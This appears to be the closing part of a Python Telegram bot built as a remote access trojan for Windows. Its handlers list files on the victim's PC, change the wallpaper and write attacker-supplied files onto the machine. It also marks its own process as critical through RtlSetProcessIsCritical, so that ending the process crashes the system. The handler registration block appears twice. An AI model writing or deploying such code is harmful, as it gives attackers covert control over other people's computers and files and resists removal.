        context.user_data['listfiles_mode'] = False
        bot.send_message(chat_id, f"📂 Files:\n{list_files(text)}")
    
    elif context.user_data.get('wallpaper_mode'):
        context.user_data['wallpaper_mode'] = False
        bot.send_message(chat_id, set_wallpaper(text))

def handle_document(update, context):
    chat_id = update.message.chat.id
    doc = update.message.document
    
    if context.user_data.get('awaiting_upload'):
        context.user_data['awaiting_upload'] = False
        file = bot.get_file(doc.file_id)
        file_data = file.download_as_bytearray()
        result = upload_file_to_pc(file_data, doc.file_name)
        bot.send_message(chat_id, result)

dp.add_handler(CommandHandler("start", start))
dp.add_handler(CallbackQueryHandler(callback))
dp.add_handler(MessageHandler(Filters.document, handle_document))
dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

try:
    ctypes.windll.ntdll.RtlSetProcessIsCritical(True, False, False)
except:
    pass

dp.add_handler(CommandHandler("start", start))
dp.add_handler(CallbackQueryHandler(callback))
dp.add_handler(MessageHandler(Filters.document, handle_document))
dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

updater.start_polling()
updater.idle()
